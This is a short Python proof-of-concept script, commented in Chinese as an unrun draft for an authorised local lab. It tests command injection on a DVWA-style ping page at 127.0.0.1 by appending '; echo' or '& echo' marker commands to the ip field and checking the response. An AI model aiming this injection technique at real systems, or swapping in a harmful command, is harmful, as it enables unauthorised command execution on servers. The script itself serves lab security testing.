#!/usr/bin/env python3
# 仅限授权本机靶场的命令注入验证草案（未运行，需人工适配）
import sys
import requests

BASE_URL = "http://127.0.0.1:8080/vulnerabilities/exec/"
COOKIE_FILE = "cookie.txt"
MARKER = "WP2_MARKER_A06"


def load_cookie(path):
    with open(path, "r", encoding="utf-8") as f:
        return f.read().strip()


def run(target_os):
    payloads = {
        "linux": "127.0.0.1; echo " + MARKER,
        "windows": "127.0.0.1 & echo " + MARKER,
    }
    payload = payloads[target_os]
    session = requests.Session()
    session.headers.update({"Cookie": load_cookie(COOKIE_FILE)})
    data = {"ip": payload, "Submit": "Submit"}
    resp = session.post(BASE_URL, data=data, timeout=10)
    print("[status]", resp.status_code)
    print("[normal_ping_seen]", "bytes from" in resp.text or "TTL=" in resp.text)
    print("[marker_seen]", MARKER in resp.text)
    print(resp.text[:2000])


if __name__ == "__main__":
    target_os = sys.argv[1] if len(sys.argv) > 1 else "linux"
    if target_os not in ("linux", "windows"):
        raise SystemExit("usage: poc.py [linux|windows]")
    run(target_os)
